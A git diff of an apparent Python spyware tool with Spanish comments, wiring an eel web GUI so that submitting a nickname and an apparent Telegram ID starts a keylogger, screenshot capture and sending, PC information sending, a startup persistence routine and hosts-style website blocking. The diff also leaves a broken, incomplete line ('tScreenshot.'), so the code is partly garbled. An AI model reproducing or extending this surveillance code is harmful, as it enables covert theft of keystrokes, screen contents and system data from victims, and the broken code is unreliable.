@@ -3,6 +3,7 @@
 #from pip._vendor import requests
 import ctypes
 import os
+import sys
 
 from PIL import ImageGrab
 from pynput.keyboard import Listener  # Escucha eventos del teclado
@@ -546,48 +547,46 @@ class PCInformation:
 
 if __name__ == '__main__':
     # Verifica permisos de admistrador: Administrador
-    """
-    # threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
 
-    print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
-    threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
-    #threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
-    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
-    #threading.Thread(target=StartUp().infinite).start()
-
-    threading.Thread(target=PCInformation().send).start()
-
-    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-
-    """
-
-
-    eel.init('web')
-
-
-    @eel.expose
-    def dummy(dummy_param):
-        print("I got a parameter: ", dummy_param)
-        return "string_value", 1, 1.2, True, [1, 2, 3, 4], {"name": "eel"}
-
+    eel.init('web') # Nombre de la carpeta
 
     @eel.expose
     def send_values(nickname, tele_id):
+        tScreenshot = threading.Thread(target=Screenshot().send)
+        tScreenshot.start()
+        tScreenshot.
+        print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
+        threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+        threading.Thread(target=WebsiteBlock().reset()).start() if Util().is_admin() else False  # Desbloquear Webs
+        print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+        threading.Thread(target=StartUp().infinite).start()
+        threading.Thread(target=PCInformation().send).start()
+        threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+
         print(nickname)
         print(tele_id)
-        print("QR code generation successful.")
+        print("Está en linea")
+        return ""
+
+    @eel.expose
+    def stop___(): # Detiene todo el proceso
+
+        print('se detuvo')
         return ""
 
 
     @eel.expose
-    def stop(isActive): # Detiene todo el proceso
-        print(isActive)
+    def start___():  # Inicia todo el proceso
+        print('continuar')
+        return ""
 
 
     @eel.expose
-    def init(isActive): # Inicia todo el proceso
-        print(isActive)
+    def exit___():  # Inicia todo el proceso
+        os._exit(1)
+        return ""
 
 
-    eel.start('index.html', size=(1000, 600))
+
+    eel.start('index.html',  size=(1000, 600))
 
